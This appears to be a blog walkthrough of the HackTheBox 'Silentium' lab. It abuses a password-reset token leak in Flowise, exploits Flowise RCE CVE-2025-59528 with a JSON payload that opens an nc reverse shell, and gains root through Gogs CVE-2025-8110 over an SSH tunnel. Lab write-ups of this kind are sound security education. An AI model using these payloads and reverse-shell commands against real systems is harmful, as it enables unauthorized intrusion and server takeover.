---
title: HackTheBox - Silentium
author: r2cook
categories:
  - HackTheBox
tags:
  - Silentium
  - Flowise
  - Gogs
  - CVE-2025-59528
  - CVE-2025-8110
  - docker
  - port-forwarding
  - ssh-tunneling
  - vhost
  - auth-bypass
  - temp-token-abuse
  - RCE
render_with_liquid: false
media_subpath: /images/htb/silentium/
image:
  path: room_image.png
date: 2026-04-17
---

---

> In this walkthrough, we compromise the TryHackMe **Silentium** machine by enumerating a **Flowise AI staging instance**, discovering an exposed **API key**, identifying the running **Flowise 3.0.5 API**, and exploiting **CVE-2025-59528** to achieve remote code execution inside a **Docker container**. From there, we pivot by harvesting **environment credentials** to gain access as **ben via SSH**, and finally escalate to **root** by abusing a locally exposed **Gogs 0.13.3 service (CVE-2025-8110)** accessed through **SSH port forwarding**, leading to full system compromise.

---

## Initial Setup

First, add the target to your hosts file:

```plaintext
10.129.32.122 silentium.htb
```

{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

```shell
┌──(cyperowl㉿kali)-[/tmp/tmp.5JemdcDcTx]
└─$ rustscan -a silentium.htb -g
10.129.32.122 -> [22,80]
             
┌──(cyperowl㉿kali)-[/tmp/tmp.5JemdcDcTx]
└─$ nmap -sC -sV -Pn -T4 -p 22,80 -oA scan silentium.htb
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-17 03:52 +0200
Nmap scan report for silentium.htb (10.129.32.122)
Host is up (0.079s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds    
```
{: .nolineno }

Nothing fancy here — just SSH and a web server. Classic starting point.

---

## Web 80

![](web_80.png){: width="800" height="400" .shadow }

Time to poke around the web app.

```shell
$ ffuf -u http://silentium.htb \ 
-H "HOST: FUZZ.silentium.htb" \
-w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
-fw 6 -c
...

staging              [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 133ms]
:: Progress: [5000/5000] :: Job [1/1] :: 417 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```
{: .nolineno }

Nice — we found a subdomain: `staging`.

Add it to `/etc/hosts`:

```plaintext
10.129.32.122 silentium.htb staging.silentium.htb
```
{: file="/etc/hosts" }

Now navigate to:

```text
http://staging.silentium.htb
```

![](staging_silentium_htb.png){: width="800" height="400" .shadow }

Looking at the page source, we can see it's using **Flowise AI agent**.

At this point, I tried messing around with the **Sign In** functionality using random credentials just to understand how authentication behaves.

![](staging_silentium_htb_signup.png){: width="800" height="400" .shadow }

Captured the request with Burp — turns out login is handled via:

```
/api/v1/auth/login
```

![](staging_silentium_htb_signup_req_burp.png){: width="800" height="400" .shadow }

Submitting random credentials gives:

```json
{
	"statusCode":404,
	"success":false,
	"message":"User Not Found",
	"stack":{}
}
```

![](staging_login_req_burp.png){: width="800" height="400" .shadow }

After trying multiple credentials (and of course throwing some SQLi attempts like a responsible hacker), nothing worked. So… time to think a bit instead of brute forcing like a caveman.

Going back to the main site, the **Institutional Leadership** section reveals some names:

- Marcus Thorne
    
- Ben
    
- Elena Rossi

![](web80_leadership.png){: width="800" height="400" .shadow }

Tried using these as potential usernames. One response stood out:

`ben@silentium.htb`

```json
{
	"statusCode":401,
	"success":false,
	"message":"Incorrect Email or Password",
	"stack":{}
}
```

![](staging_login_req_burp_trying_ben.png){: width="800" height="400" .shadow }

That’s interesting — different response means the user actually exists. Good user enumeration.

Tried brute-forcing the password… no luck. (and yeah, I didn’t feel like waiting forever either).

So next step: **Forget Password**.

![](staging_forget_password_web.png){: width="800" height="400" .shadow }

Entered:

```
ben@silentium.htb
```

Captured the request with Burp. Once sent, the response casually leaks some _very_ sensitive information (thanks devs 🙃).

Most importantly:

```json
"tempToken":"tc39vy68cpVV1Du0DRSiwRpd3PZP6AwbVPXowQIrMdmbvPXeF4QPAkLr7RXrJmhI"
```

![](staging_forget_password_burp.png){: width="800" height="400" .shadow }

So yeah… instead of sending an email, the app just hands us the reset token directly. Very generous.

---

## Password Reset

Now head to **Reset Password**.

![](staging_reset_password_web.png){: width="800" height="400" .shadow }

Fill in:

- Email
    
- TempToken
    
- New password
    

Submit the request.

Burp shows a `201` response — which means it worked.

![](staging_reset_password_burp.png){: width="800" height="400" .shadow }

---

## Login as ben

Now we can log in using the new credentials for `ben`.

![](flowise_login_success.png){: width="800" height="400" .shadow }

And just like that — we’re in.

---

playing around in the dashboard but to be honslty i wasn’t very familiar with `Flowise`, but i found something interesting — an **API Key** exposed in the interface

![](flowise_api_key.png){: width="800" height="400" .shadow }

that’s actually a big deal

Flowise uses API keys to authenticate requests to its backend API, so having this key means we can directly interact with internal endpoints instead of relying only on the UI

so at this point, it makes sense to start fuzzing the API and see what we can find

---

## API Fuzzing

trying multiple wordlists, but the classic `common.txt` worked for me

```shell
$ ffuf -u http://staging.silentium.htb/api/v1/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -ac | tee ffuf_api_common.txt
...
version                 [Status: 200, Size: 19, Words: 1, Lines: 1, Duration: 94ms]
...

$ curl -s -X GET http://staging.silentium.htb/api/v1/version

{"version":"3.0.5"}
```
{: .nolineno }

so now we know the API version is `Flowise 3.0.5`

---

searching online for it, i found that this version is vulnerable to RCE with [CVE-2025-59528](https://nvd.nist.gov/vuln/detail/CVE-2025-59528)

![](nvd_nist_cve_2025_59528.png){: width="800" height="400" .shadow }

found also a PoC on [Github](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p)

```shell
curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```
{: .nolineno }

---

## Shell as Docker Root

the reverse shell payload i used

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> 9001 >/tmp/f
```
{: .nolineno }

open a listener

```shell
$ nc -nlvp 9001 
```
{: .nolineno }

adding the request data to `payload.json` and replacing it with your IP

```json
{
  "loadMethod": "listActions",
  "inputs": {
    "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR-IP> 9001 >/tmp/f\");return 1;})()})"
  }
}
```

{: file="payload.json" }

then building the curl request, changing the domain and the token with the one we found in the `flowise` dashboard

```shell
$ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d @payload.json
```
{: .nolineno }

![](doocker_root_shell.png){: width="800" height="400" .shadow }

we now have a shell as root inside a docker container

---

## Shell as ben

typing `env` to list all environment variables reveals multiple exposed credentials

```shell
~ # env
...
SMTP_PASSWORD=[REDCATED]
...
~ #
```
{: .nolineno }

since no SMTP service was exposed during the nmap scan, i tried reusing those credentials

logging in via ssh as:

```shell
$ ssh ben@silentium.htb
```
{: .nolineno }

and it worked

![](shell_as_ben.png){: width="800" height="400" .shadow }

from there, we can locate the user flag in ben’s home directory

```shell
/home/ben/user.txt
```
{: .nolineno }

---

## shell as (real) root

at this point, i wanted to see what services are currently running on the system — maybe something interesting is hiding there

```shell
ben@silentium:~$ systemctl list-units --type=service --state=running
...
gogs.service              loaded active running Gogs Git Service
...
```
{: .nolineno }

and yeah, `gogs.service` immediately stands out — definitely not something you see every day, so worth digging into

---

next, i wanted to check what ports are actually listening and whether anything is bound locally

```shell
ben@silentium:~$ ss -tulnp
...
127.0.0.1:3001
127.0.0.1:3000
```
{: .nolineno }

interesting… both ports are bound to `127.0.0.1`, meaning they are not exposed externally — only accessible from inside the machine

that explains why we didn’t see them during the initial scan

---

since port `3001` looks suspicious, i tried to see what’s actually running there

```shell
curl 127.0.0.1:3001 | less
```
{: .nolineno }

![](curl_localhost_3001_gogs.png){: width="800" height="400" .shadow }

and there it is — a **Gogs** web interface

---

now that i know the service name, i want to locate where it’s installed on disk

```shell
ben@silentium:~$ find / -name gogs 2>/dev/null
/opt/gogs
/opt/gogs/gogs
...
```
{: .nolineno }

nice, looks like it’s installed under `/opt/gogs`, so let’s navigate there and check the version

---

```shell
ben@silentium:/opt/gogs/gogs$ ./gogs --version
Gogs version 0.13.3
```
{: .nolineno }

perfect — now we know it’s running `Gogs 0.13.3`

---

searching online for this version leads to:

[CVE-2025-8110](https://www.cve.org/CVERecord?id=CVE-2025-8110)  
PoC [Github](https://github.com/Ghxstsec/CVE-2025-8110)

this vulnerability allows remote command execution through authenticated functionality in Gogs  
basically, once you have a valid user and API token, you can abuse the application logic to execute commands on the server

so now the goal is clear: we need a valid Gogs account

---

but there’s a small problem — the service is only accessible locally, so we can’t open it directly from our machine

so i thought about tunneling the port over SSH

---

```shell
ssh -L 3001:127.0.0.1:3001 ben@silentium.htb
```
{: .nolineno }

this forwards our local port `3001` to the target’s `127.0.0.1:3001`

so anything we open locally on:

```
http://127.0.0.1:3001/
```

will actually hit the Gogs service on the target

![](ssh_local_tunnel.png){: width="800" height="400" .shadow }

---

opening it in the browser:

![](gogs_web_view.png){: width="800" height="400" .shadow }

and it works

so i went ahead and registered a new account (e.g. `pwnuser`)

![](gogs_register.png){: width="800" height="400" .shadow }

---

after logging in, i went to **Your Settings**

![](gogs_logged_in.png){: width="800" height="400" .shadow }

then navigated to **Applications** and generated a new token

![](gogs_genrate_token.png){: width="800" height="400" .shadow }

copied the token and updated the PoC script with:

- my username
    
- my token
    

![](cve_script_edit_with_our_creds.png){: width="800" height="400" .shadow }

---

now time to catch the shell, so i opened a listener

```shell
$ nc -lnvp 9002
```
{: .nolineno }

then ran the exploit

```shell
$ python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:3001 -lh 10.10.17.25 -lp 9002 -p pass1
```
{: .nolineno }

note: i already downloaded the PoC, created a virtual environment, and installed the requirements (check the repo README.md)

![](run_cve_script.png){: width="800" height="400" .shadow }

if the script fails while creating the repository, try changing the repo name or just hardcode it

---

after running the exploit, i checked my listener

![](root_shell.png){: width="800" height="400" .shadow }

and got a shell as **root**

finally, grabbing the root flag:

```shell
/root/root.txt
```
{: .nolineno }
---
